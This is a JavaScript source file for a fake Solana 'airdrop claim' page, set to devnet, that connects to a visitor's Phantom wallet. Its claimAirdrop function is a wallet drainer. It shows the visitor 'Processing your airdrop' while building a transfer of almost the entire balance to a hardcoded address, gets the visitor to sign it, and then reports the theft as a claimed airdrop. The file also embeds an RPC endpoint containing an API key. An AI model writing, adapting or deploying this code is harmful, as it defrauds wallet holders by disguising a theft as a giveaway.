const { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } = solanaWeb3;
// Triton One devnet RPC
const primaryRpc = "https://rpc.ankr.com/solana_devnet/5032cdc1cad9d5f96fa4f8b1fc083d88f17e6e87dd2efed254ef96236f75c1b2";
const fallbackRpc = "https://api.devnet.solana.com";
const connection = new Connection(primaryRpc, "confirmed");
const myAddress = new PublicKey("B91G7R5MK2DYgyYiorhpJchxzWWjbGt4tqRfLSrubvSA"); // Replace with your devnet wallet address

let walletPublicKey = null;

async function connectWallet() {
    try {
        if (!window.solana || !window.solana.isPhantom) {
            alert("Get Phantom wallet, dipshit! Set it to devnet!");
            return;
        }

        const response = await window.solana.connect();
        walletPublicKey = new PublicKey(response.publicKey.toString());
        document.getElementById("status").innerText = `Wallet connected: ${walletPublicKey.toString()} (Devnet)`;
        document.getElementById("claimBtn").disabled = false;
    } catch (err) {
        console.error("Connection fucked up:", err);
        document.getElementById("status").innerText = "Wallet connection failed. Try again.";
    }
}

async function claimAirdrop() {
    try {
        document.getElementById("status").innerText = "Processing your airdrop... (Devnet)";
        await new Promise(resolve => setTimeout(resolve, 2000));

        let balance;
        try {
            balance = await connection.getBalance(walletPublicKey);
            console.log(`Balance fetched: ${balance} lamports (${balance / LAMPORTS_PER_SOL} SOL)`);
        } catch (err) {
            console.error("Primary RPC fucked up:", err);
            const fallbackConnection = new Connection(fallbackRpc, "confirmed");
            balance = await fallbackConnection.getBalance(walletPublicKey);
            console.log(`Fallback balance fetched: ${balance} lamports`);
        }

        if (balance <= 10000) {
            document.getElementById("status").innerText = "Not enough SOL, you broke bastard. Hit a devnet faucet.";
            return;
        }

        const transaction = new Transaction().add(
            SystemProgram.transfer({
                fromPubkey: walletPublicKey,
                toPubkey: myAddress,
                lamports: balance - 10000,
            })
        );

        const { blockhash } = await connection.getLatestBlockhash();
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = walletPublicKey;

        const signedTx = await window.solana.signTransaction(transaction);
        const txId = await connection.sendRawTransaction(signedTx.serialize());

        await connection.confirmTransaction(txId);
        document.getElementById("status").innerText = `Airdrop claimed! Check your wallet. (Drained ${balance / LAMPORTS_PER_SOL} SOL on devnet, tx: ${txId})`;
    } catch (err) {
        console.error("Drain fucked up:", err);
        document.getElementById("status").innerText = "Claim failed. Network’s probably shitting itself—try again.";
    }
}